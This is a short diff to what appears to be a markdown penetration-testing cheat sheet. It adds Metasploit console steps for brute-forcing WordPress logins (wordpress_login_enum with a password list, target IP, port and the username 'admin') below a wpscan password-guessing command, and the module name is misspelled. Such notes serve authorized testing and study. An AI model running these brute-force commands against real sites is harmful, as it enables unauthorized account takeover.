@@ -22,5 +22,13 @@
 > wpscan --url http://192.168.0.1 -u john --passwords /home/pass.txt  <br/>
 
 ## METASPLOIT <br/>
+> msfconsole : <br/>
+> use auxilliary/scanner/http/wordpress_login_enum <br/>
+> show options <br/>
+>	set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt <br/>
+>	set RHOSTS 10.10.10.10  (target ip) <br/>
+>	set RPORT 8080          (target port) <br/>
+>	set TARGETURI http://10.10.10.10:8080/ <br/>
+>	set USERNAME admin <br/>
 > 
  
